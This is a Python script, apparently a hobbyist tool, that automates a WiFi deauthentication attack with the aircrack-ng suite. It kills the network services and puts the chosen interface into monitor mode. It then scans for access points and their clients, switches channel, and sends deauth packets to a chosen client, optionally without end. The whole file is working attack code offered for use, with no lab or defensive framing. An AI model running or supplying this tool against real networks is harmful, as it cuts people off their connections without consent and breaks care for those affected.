# writen by m.e.
# version 1.0


############################################################
#                         IMPORT                           #
############################################################

import os
from colorama import Fore, Style
import time
from subprocess import Popen, call, PIPE
import subprocess
import signal
import glob



def wifi_client_deauth():
############################################################
# 3               DELETES ALL FILES WITH OUTPUT            #
############################################################
    def delete_files():
        for file in glob.glob("output-*.csv"):
            os.remove(file)


    def searching_wifis():

        delete_files()
        time.sleep(2)

        print("[" + Fore.RED + ">" + Style.RESET_ALL + "] Looking for wifi's..." + '\n' + "[" + Fore.RED + ">" + Style.RESET_ALL + "] Please wait 10s.")
        time.sleep(2)

        wifi_mac_addr_search = Popen(['sudo', 'airodump-ng', '--write', 'output', '--output-format', 'csv', wlan_f], stderr=subprocess.DEVNULL)

        time.sleep(10)
        
        # Stops airodump-ng process
        os.kill(wifi_mac_addr_search.pid, signal.SIGINT)
        wifi_mac_addr_search.wait()



############################################################
#                           COMMANDS                      #
############################################################
    cmd_wlan = "wlan"

############################################################
# 1                         WLAN                          #
############################################################
    iwconfig = Popen(['sudo', 'iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)     # Takes info about your wifi interfaces
    output_iwconfig, err_iwconfig = iwconfig.communicate()

    try:
        print(output_iwconfig.decode())
    except:
        print("")
    try:
        print(err_iwconfig.decode())
    except:
        print("")
    time.sleep(1)
    
    # Creates varible wlan 
    wlan_num = int(input("[" + Fore.RED + ">" + Style.RESET_ALL + "] Insert wlan number: "))
    wlan_num = str(wlan_num)
    wlan_f = str("wlan" + wlan_num)



############################################################
# 2                 INFO ABOUT MONITORE MODE              #
############################################################
    print("[" + Fore.RED + ">" + Style.RESET_ALL + "] Now your wlan" + wlan_num + " will be set into monitore mode.")
    print("[" + Fore.CYAN + "!INFO" + Style.RESET_ALL  + "] You can turn wifi on by using ,,sudo service NetworkManager restart,,")

    Popen(['sudo', 'airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    Popen(['sudo', 'airmon-ng', 'start', cmd_wlan, wlan_num], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Deleting files & scan for wifis from defs

    searching_wifis()
    time.sleep(2)
    delete_files()


############################################################
# 4                  MAC ADDR WIFI CLIENTS                 #
############################################################
    mac_addr_wifi = input("[" + Fore.RED + ">" + Style.RESET_ALL + "] Insert wifi mac address : ")

    print("[" + Fore.RED + ">" + Style.RESET_ALL + "] Looking for clients..." + '\n' + "[" + Fore.RED + ">" + Style.RESET_ALL + "] Please wait 10s.")
    time.sleep(2)
    wifi_client_mac_addr_search = Popen(['sudo', 'airodump-ng', '--bssid', mac_addr_wifi, wlan_f], stderr=subprocess.DEVNULL)

    time.sleep(10)
    
    # Stops airodump-ng process
    os.kill(wifi_client_mac_addr_search.pid, signal.SIGINT)
    wifi_client_mac_addr_search.wait()


############################################################
# 5               SAME CHANNEL OF LISTENING                #
############################################################
    time.sleep(1)
    print(wifi_client_mac_addr_search)
    time.sleep(1)
    
    channel_wifi_deauth = input("[" + Fore.RED + ">" + Style.RESET_ALL + "] Insert channel number (number under CH): ")


############################################################
# 6                    CHANGE CHANNEL                      #
############################################################
    
    Popen(['sudo', 'iw', 'dev', wlan_f, 'set', 'channel', channel_wifi_deauth], stderr=subprocess.DEVNULL)
    print("[" + Fore.RED + ">" + Style.RESET_ALL + "] Changing channel on wifi interface...")
    print("[" + Fore.RED + ">" + Style.RESET_ALL + "] It may not work with your wlan")
    time.sleep(1)

############################################################
# 7                     FINAL DEAUTH                       #
############################################################
    mac_addr_client = input("[" + Fore.RED + ">" + Style.RESET_ALL + "] Insert clients (station) mac address : ")
    packets = input("[" + Fore.RED + ">" + Style.RESET_ALL + "] Enter a number depending on how many packets you want to send (0 is infinity): ")

    time.sleep(1)
    Popen(['sudo', 'aireplay-ng', '--deauth', packets, '-a', mac_addr_wifi, '-c', mac_addr_client, wlan_f])
    

    time.sleep(2)
    print(channel_wifi_deauth)



